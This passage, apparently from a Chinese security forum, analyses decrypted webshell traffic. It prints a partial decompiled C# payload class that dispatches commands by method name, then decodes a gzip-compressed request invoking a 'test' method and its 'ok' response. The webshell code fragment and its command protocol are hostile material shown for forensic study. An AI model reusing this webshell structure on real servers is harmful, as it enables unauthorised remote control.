using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Web;

// Token: 0x02000002 RID: 2
internal class LY
{
    // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
    public byte[] run()
    {
        string text = this.get("evalClassName");
        string text2 = this.get("methodName");
        if (text2 != null)
......
......
......
// Token: 0x04000007 RID: 7
    private MemoryStream outStream;

    // Token: 0x04000008 RID: 8
    private byte[] requestData;
}
```

接下来解密第二段，同样使用上面的脚本跑一下，得到：

```csharp
1F8B0800000000000000CB4D2DC9C84FF14BCC4D656261606028492D2E0100F839225013000000
```

发现是一个gzip压缩内容，同样使用CyberChef转换解压。

![Untitled 6.png](https://shs3.b.qianxin.com/attack_forum/2023/11/attach-1fa3213679b7962f12d9362b796f80abf1170fb1.png)

结果为：

```csharp
methodName  test
```

为执行test函数，函数内容为：

```csharp
public byte[] test()
    {
        return this.stringToByteArray("ok");
    }
```

以同样的方法解密响应体，得到：

```csharp
ok
```